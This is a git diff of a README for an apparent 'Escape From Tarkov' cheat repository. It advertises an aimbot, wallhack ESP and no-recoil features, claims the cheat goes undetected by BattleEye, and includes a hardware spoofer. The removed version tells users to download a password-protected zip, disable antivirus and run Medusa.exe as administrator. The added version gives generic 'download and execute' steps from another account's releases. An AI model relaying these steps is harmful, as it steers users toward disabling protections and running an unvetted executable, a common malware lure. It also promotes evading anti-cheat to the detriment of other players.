@@ -1,88 +1,67 @@
-# Escape From Tarkov Medusa Hack 
-> 🚫 **Undetected on current BattleEye version**  
-> 🖥 Supported: Windows 10 / 11 (x64) | Intel & AMD CPUs  
-> 📁 Loader-based | Safe | Clean UI | Regular Updates | Built-in Spoofer
----
-![{3341F318-375D-4489-9167-70111B8F7F50}](https://github.com/user-attachments/assets/c4791394-5176-4879-ae1d-de5cd0318adb)
----
-## 📥 Download
+# Escape From Tarkov - Medusa Rage Undetected Cheat
 
-1. **Get the latest version** (https://github.com/Biananst/Escape-From-Tarkov-Medusa-Rage-Undetected-Cheat/releases/download/latest/Medusa.zip).
-2. **Unzip the Files**: Use the pass `Medusa`.
+![Escape From Tarkov](https://img.shields.io/badge/Escape%20From%20Tarkov-Medusa%20Cheat-blue?style=flat-square&logo=github)
 
----
+Welcome to the **Escape From Tarkov - Medusa Rage Undetected Cheat** repository. This project offers a comprehensive cheat solution for the popular game Escape From Tarkov, featuring an aimbot, ESP, and RageBot functionalities. The cheat is regularly updated for 2025 and is compatible with Windows 10 and 11.
 
-## 🔧 Installation Guide
+## Table of Contents
 
-<details>
-  <summary>Show Instructions</summary>
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Updates](#updates)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-  1. Download the archive from the button above  
-  2. Disable antivirus or add exception for the folder  
-  3. Extract files to a clean directory  
-  4. Run `Medusa.exe` as administrator
-  5. Select from the drop-down menu whether you want to use the built-in spoofer
-  6. Start Tarkov **after injection** is complete  
-  7. Open the menu with `Insert` or your custom keybind
+## Features
 
-</details>
+The Medusa Cheat provides a variety of features designed to enhance your gaming experience:
 
----
-## ⚔️ Features Overview
+- **Aimbot**: Automatically aims at opponents for improved accuracy.
+- **ESP (Extra Sensory Perception)**: Displays the location of enemies, loot, and other important items through walls.
+- **RageBot**: Aggressive targeting options to dominate opponents.
+- **Miscellaneous Features**: Additional tools to improve gameplay and strategy.
 
-### 🔫 Aimbot
-- `Memory-Based Aimbot` – Ultra-fast, low-input latency
-- `Silent Aim` – No camera movement, server-side lock
-- `FOV Limit` – Adjustable field of view radius
-- `Bone Selection` – Head / Chest / Pelvis
-- `Visible Check` – Aim only on visible targets
-- `Target Prioritization` – Closest / Lowest HP / Crosshair
-- `Custom Keybind` – Hold or toggle to activate aim
-- `Smooth Aim` – Human-like tracking
+## Installation
 
----
+To install the Medusa Cheat, follow these steps:
 
-### 🔍 ESP (Wallhack)
-- `2D Box ESP` – Show player bounds (Box / Corner style)
-- `Health Bar` – See enemy HP above heads
-- `Distance ESP` – View exact distance to enemies
-- `Name ESP` – Show in-game names
-- `Team Check` – Ignores teammates
-- `Chams` – Colored player model outlines
-- `Skeleton` – Draw player bone structures
-- `Render Distance` – Fully configurable
+1. Download the latest version from the [Releases](https://github.com/HANUMANISH/Escape-From-Tarkov-Medusa-Rage-Undetected-Cheat/releases) section.
+2. Execute the downloaded file to install the cheat.
+3. Follow the on-screen instructions to complete the installation.
 
----
+## Usage
 
-### 🎒 Item ESP
-- `Weapon Crates`, `Powerups`, `Loot Points`
-- `Show Rarity Colors` – Grey / Green / Blue / Purple / Orange
-- `Show Distance` – Range filter to reduce clutter
-- `Custom ESP Toggle Key`
+After installation, you can start using the cheat in Escape From Tarkov. Here’s how:
 
----
+1. Launch Escape From Tarkov.
+2. Start the Medusa Cheat application.
+3. Adjust settings as needed within the cheat interface.
+4. Begin your game and enjoy enhanced gameplay.
 
-### 🧠 NPC ESP
-- `Show Bot Locations` – AI indicators
-- `Neutral / Aggressive AI Color Coding`
-- `Health + Name ESP`
+## Updates
+
+We regularly update the Medusa Cheat to ensure compatibility with the latest game patches and to improve features. Check the [Releases](https://github.com/HANUMANISH/Escape-From-Tarkov-Medusa-Rage-Undetected-Cheat/releases) section for the latest updates and download links.
+
+## Contributing
+
+We welcome contributions to improve the Medusa Cheat. If you have suggestions or find bugs, please open an issue or submit a pull request. 
+
+### Guidelines
+
+- Ensure your code follows the existing style.
+- Test your changes thoroughly before submitting.
+- Provide a clear description of your changes.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, please reach out via the GitHub issues section or contact the repository maintainer directly.
 
 ---
 
-### 🛠 Misc
-- `No Recoil` – Remove recoil pattern from weapons
-- `No Spread` – Increase weapon accuracy
-- `Custom Crosshair` – Visible at all times
-- `FPS Indicator` – In-game performance display
-- `Config System` – Save & load user profiles
-- `Stealth Mode` – Prevents detection overlays
-
----
-
-## ❗ FAQ
-
-- **Is it undetected right now?**  
-  ✅ Yes – regularly tested and updated to avoid detection.
-
-- **Can I use this in competitive mode?**  
-Use at your own risk. Features work in all game types, but we recommend PvE/Unranked.
+Feel free to explore the repository, contribute, and enjoy a more exciting experience in Escape From Tarkov!
